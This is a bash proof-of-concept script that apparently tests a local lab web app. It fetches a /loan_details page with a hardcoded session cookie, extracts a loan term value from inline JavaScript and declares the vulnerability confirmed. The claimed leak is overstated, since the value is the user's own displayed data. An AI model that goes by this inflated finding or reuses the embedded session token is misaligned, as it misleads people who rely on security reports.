#!/bin/bash

# POC: Sensitive Data Leakage Through JavaScript Variables
# This script demonstrates that sensitive loan information (term value)
# is exposed through hardcoded JavaScript variables in the /loan_details endpoint

TARGET_URL="http://localhost:80/loan_details"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ443Q.kDdIuhtbQX5J69yAt4YdbsLI_dM"

echo "=========================================="
echo "POC: Sensitive Data Leakage via JavaScript"
echo "=========================================="
echo ""
echo "Target URL: $TARGET_URL"
echo "Session: $SESSION_COOKIE"
echo ""

# Fetch the /loan_details page
echo "[*] Fetching /loan_details endpoint..."
response=$(curl -s "$TARGET_URL" -H "Cookie: $SESSION_COOKIE")

echo "[*] Searching for sensitive data in JavaScript code..."
echo ""

# Extract script blocks and look for the term parameter
echo "[+] JavaScript code containing sensitive data:"
echo ""
echo "$response" | grep -o "<script>.*</script>" | sed 's/<script>//g' | sed 's/<\/script>//g' | while IFS= read -r line; do
    if [[ "$line" == *"term"* ]]; then
        echo "    $line"
    fi
done

echo ""
echo "[+] Extracting amortization iframe src with exposed term value:"
iframe_src=$(echo "$response" | grep -oP "attr\('src',\s*'[^']*'\)" | head -1)
if [ -n "$iframe_src" ]; then
    echo "    Found: $iframe_src"
    # Extract the term value
    term_value=$(echo "$iframe_src" | grep -oP "term=\K[0-9]+" | head -1)
    if [ -n "$term_value" ]; then
        echo "    Extracted sensitive term value: $term_value months"
    fi
fi

echo ""
echo "[+] Verification: Checking if term value is visible in page source..."
if echo "$response" | grep -q "term=60"; then
    echo "    ✓ Term value '60' is directly exposed in JavaScript code"
    echo "    ✓ Vulnerability confirmed: Sensitive data is accessible via:"
    echo "      - Page source viewing (Ctrl+U or View Source)"
    echo "      - Browser Developer Tools (F12 > Sources tab)"
    echo "      - Page caching/archival systems"
    echo "      - Man-in-the-middle attacks"
    echo "      - Browser history"
fi

echo ""
echo "[+] Comparison with actual displayed text:"
displayed_text=$(echo "$response" | grep -oP "The term of your loan principal \K[0-9]+" | head -1)
if [ -n "$displayed_text" ]; then
    echo "    Displayed term value on page: $displayed_text months"
    echo "    JavaScript variable term value: $term_value months"
    if [ "$displayed_text" == "$term_value" ]; then
        echo "    ✓ Sensitive value is duplicated in both JavaScript AND displayed HTML"
    fi
fi

echo ""
echo "=========================================="
echo "Vulnerability Status: CONFIRMED"
echo "=========================================="